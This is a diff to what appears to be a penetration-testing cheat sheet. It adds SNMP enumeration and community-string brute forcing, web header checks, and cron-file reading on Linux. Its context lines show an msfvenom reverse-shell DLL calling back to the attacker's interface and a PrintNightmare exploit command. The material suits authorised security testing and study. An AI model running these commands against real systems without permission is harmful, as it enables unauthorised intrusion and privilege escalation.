@@ -79,6 +79,22 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=$tun0 lport=53 -f dll -o /opt/wi
 python3 printnightmare.py domain.local/user:password@$ip '\\$tun0\winreconpack\thescriptkid.dll'
 ```
 
+### SNMP Testing
+
+#### Scan SNMP
+
+```
+snmpwalk -v 2c -c public $ip 1.3.6.1.2.1.1.5.0
+```
+
+#### Brute force SNMP secret string
+
+```
+onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt $ip
+```
+
+Brute force SNMP secret string
+
 ### SMB Testing
 
 #### Search SMB Known Version Vulnerabilities
@@ -311,6 +327,16 @@ Add domain or hostname to Kali /etc/hosts file and review landing page /
 * Discover User Logins.
 * Discover User Registrations.
 
+#### View Certificate Information
+
+Browse to the `https://$ip/` and view the certificate
+
+#### Retrieve Server Header Information
+
+```
+curl -IL $webserver
+```
+
 #### Bruteforce Directories and Files
 
 Be sure to test both http and https
@@ -513,7 +539,9 @@ Windows 7, 8, 10, Server 2008, and Server 2012
 shutdown /r /t 0
 ```
 
-#### SeTakeOwndershipPrivilege
+#### SeManageVolumePrivilege
+
+#### SeTakeOwnershipPrivilege
 
 ### Test For alwayselevated
 
@@ -1408,6 +1436,14 @@ getcap -r / 2>/dev/null
 
 ```
 cat /etc/crontab
+```
+
+```
+ls /etc/cron.d
+```
+
+```
+cat /var/spool/cron/crontabs/root
 ```
 
 #### Path
